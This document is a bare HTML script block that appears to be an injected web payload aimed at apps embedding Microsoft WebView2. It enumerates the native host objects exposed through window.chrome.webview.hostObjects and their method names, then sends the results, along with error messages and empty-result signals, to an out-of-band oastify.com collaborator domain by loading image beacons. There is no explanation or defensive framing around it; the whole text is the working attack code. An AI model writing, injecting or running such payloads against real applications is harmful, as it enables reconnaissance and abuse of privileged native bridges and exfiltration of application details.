<script>
  (() => {
  try {
    const hostObjects = window.chrome?.webview?.hostObjects;
    if (!hostObjects) {
      new Image().src = 'https://zpsaoqfhj88e3qfypvqey67bo2utim6b.oastify.com/no-hostobjects';
      return;
    }

    const keys = Object.keys(hostObjects);
    if (keys.length === 0) {
      new Image().src = 'https://zpsaoqfhj88e3qfypvqey67bo2utim6b.oastify.com/empty';
      return;
    }

    for (const key of keys) {
      const methods = [];
      for (const prop in hostObjects[key]) {
        methods.push(prop);
      }

      new Image().src = `https://zpsaoqfhj88e3qfypvqey67bo2utim6b.oastify.com/${key}?methods=${encodeURIComponent(methods.join(","))}`;
    }
  } catch (e) {
    new Image().src = 'https://zpsaoqfhj88e3qfypvqey67bo2utim6b.oastify.com/error?msg=' + encodeURIComponent(e.message);
  }
})();

</script>
